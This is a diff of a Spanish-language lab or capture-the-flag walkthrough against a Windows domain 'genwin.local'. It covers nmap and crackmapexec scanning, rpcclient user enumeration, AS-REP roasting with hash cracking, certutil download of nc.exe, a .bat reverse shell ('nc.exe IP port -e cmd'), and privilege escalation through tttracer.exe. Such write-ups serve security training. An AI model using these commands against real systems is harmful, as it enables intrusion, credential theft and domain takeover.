@@ -1,8 +1,68 @@
+User.txt
+
+Escanear la red:
+nmap 192.168.56.0/24 -sn
+
+crackmapexec smb 192.168.56.0/24 -> con este comando se averigua en que IP esta Domain Controller.
+
+Apuntamos en /etc/hosts la IP del DC y del dominio:
+    IP  genwin.local DC-Company 
+
 
 Obtener listado usuarios con rpcclient:
-rpcclient -U "genwin.local\username%password" IP
+rpcclient -U "genwin.local\username%password" IP_DC
     - enumdomusers y nos guardamos los nombres en un archivo 
 
-GetNPUsers.py genwin.local/ -no-pass -usersfile file.txt 
 
-este hash se puede romper con john
+Miramos si hay algun usuario con el que se pueda realizar un ataque ASREPRoast
+GetNPUsers.py genwin.local/ -no-pass -usersfile file.txt 
+Nos guardamos el hash en un fichero y lo rompemos con john:
+john -w wordlist hash
+
+ya nos podemos conectar al windows 10 con rdesktop:
+rdesktop -u 'username@genwin.local' -p 'password' IP
+
+
+
+Root.txt
+
+Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.
+
+Una vez dentro, vemos los usuarios locales -> net user
+ y vemos que hay uno con nuestro mismo nombre, intentamos hacer un runas con las misma credenciales:
+runas /user:username powershell 
+
+Miramos nuestros prvilegios:
+    - whoami /all
+    - net user username
+
+Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
+    net localgroup group_name 
+
+En la descripcion pone que podemos ejecutar el binario tttracer.exe con privilegios administrador de la siguiente forma:
+C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'
+
+Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
+Y nos pone lo que tenemos que hacer para realizar la escalada.
+
+Podemos ejecutar cualquier ejecutable, ya sea .exe o .bat. 
+Primero nos descargamos nuestro binario nc.exe:
+    - En nuestra PC -> python3 -m http.server
+    - En la maquina victima -> certutil -f -urlcache -split http://IP:PORT/nc.exe -> El PORT por defecto es 8000
+
+Ahora creamos un .bat para ejecutar el nc.exe:
+    - Abrimos el notepad -> notepad.exe file.bat
+        - C:\PATH\nc.exe IP port -e cmd
+
+Probamos si funciona haciendo un nc en nustra maquina y ejecutando el file.bat.
+
+Ahora que ya esta todo preparado, ejecutamos el binario como dice lolbas:
+En nuestra terminal de linux ejecutamos:
+    - nc -lvp PORT
+
+Este es el comando:
+    - tttracer.exe C:\path\lalala.bat
+pero tenemos que poner lo siguiente:
+    -  C:\Users\Administrator\Desktop\script.exe -ArgumentList 'C:\path\lalala.bat'
+
+Una vez somos administrador, es un escritorio, se puede ver un archivo en el que esta su contraseña. Ya podemos conectarnos al DC como administrador con rdesktop y atacar a todo el dominio.
